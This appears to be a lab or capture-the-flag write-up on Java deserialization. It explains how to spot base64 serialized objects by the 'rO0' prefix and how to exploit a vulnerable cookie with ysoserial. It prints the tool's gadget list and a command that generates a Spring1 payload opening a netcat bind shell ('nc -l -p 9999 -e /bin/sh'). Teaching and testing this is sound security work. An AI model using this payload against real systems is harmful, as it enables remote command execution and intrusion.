# ObjectInputStream

The root cause of this issue comes from the fact that the application uses the method `readObject()` on data coming from the user. However, this is only one part of the  problem. In Java (as opposed to Python for example), the path from  unserialise to code execution is not obvious. To gain code execution, a  suit of gadgets need to be found in the libraries loaded by the  application. Some security researchers are currently finding a lot of  these gadgets in common libraries and getting them fixed. These  libraries are not directly vulnerable, but they allow the exploitation  of an application using `readObject` and loading them.

### Finding where the serialized object used

A good indicator is the string `rO0`, which is the base64 encoded version of `\xac\xed\x00`. Since serialised Java objects contain a lot of special characters, it's very common for them to get encoded before being transmitted over HTTP.

In this application the cookie is starting with `rO0` . 

Once you find where a serialised Java object is used, you will need to base64-encode your payload. **Use `base64 -w 0` to avoid new lines**

### Exploit

The tool **ysoserial**  can be used to exploit this issue. This tool allows an attacker to build malicious Java object that will provide command execution. 

This tool currently embeds gadgets for the following libraries:

```bash
$ java -jar ysoserial-0.0.4-all.jar 
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
  Available payload types:
    CommonsBeanutilsCollectionsLogging1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2]
    CommonsCollections1 [commons-collections:commons-collections:3.1]
    CommonsCollections2 [org.apache.commons:commons-collections4:4.0]
    CommonsCollections3 [commons-collections:commons-collections:3.1]
    CommonsCollections4 [org.apache.commons:commons-collections4:4.0]
    Groovy1 [org.codehaus.groovy:groovy:2.3.9]
    Jdk7u21 []
    Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE]
```

as **Spring** is not available so we will use **Spring1** payload.

We can get `ysoserial` to generate our payload using:

```bash
java -jar ysoserial-0.0.4-all.jar Spring1 "/usr/bin/nc -l -p 9999 -e /bin/sh" 
```

